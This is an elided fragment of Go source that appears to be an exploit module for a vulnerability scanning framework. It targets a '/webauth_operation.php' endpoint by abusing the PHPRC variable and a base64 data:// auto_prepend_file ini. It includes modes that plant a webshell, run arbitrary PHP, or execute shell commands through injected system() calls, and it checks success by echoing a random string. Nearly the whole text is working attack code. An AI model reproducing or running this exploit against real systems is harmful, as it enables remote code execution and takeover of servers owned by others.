...
1
auto_prepend_file="data://text/plain;base64,`+strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(content)), "+", "%2b")+`"
	...
	ExpManager.AddExploit(NewExploit(
		...
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			...
			if attackType == "webshell" {
				...
				_, err := sendPayloadb81eed3e(expResult.HostInfo, content)
				if err != nil {
				...
				cfgIncludeINI := httpclient.NewGetRequestConfig("/webauth_operation.php?PHPRC=/var/tmp/" + iniName)
				cfgIncludeINI.VerifyTls = false
				cfgIncludeINI.FollowRedirect = false
				rsp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgIncludeINI)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if rsp.StatusCode != 200 && rsp.StatusCode != 503 && rsp.StatusCode != 500 {
			...
			} else if attackType == "phpCode" {
				checkStr := goutils.RandomHexString(8)
				rsp, err := sendPayloadb81eed3e(expResult.HostInfo, `<?php echo `+strconv.Quote(checkStr)+`; ?>`+goutils.B2S(ss.Params["phpCode"]))
				if err != nil {
					expResult.Output = err.Error()
				...
				checkStr := goutils.RandomHexString(8)
				rsp, err := sendPayloadb81eed3e(expResult.HostInfo, `<?php echo `+strconv.Quote(checkStr)+`; system('`+cmd+`'); ?>`)
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(rsp.Utf8Html, checkStr) {
					expResult.Success = true
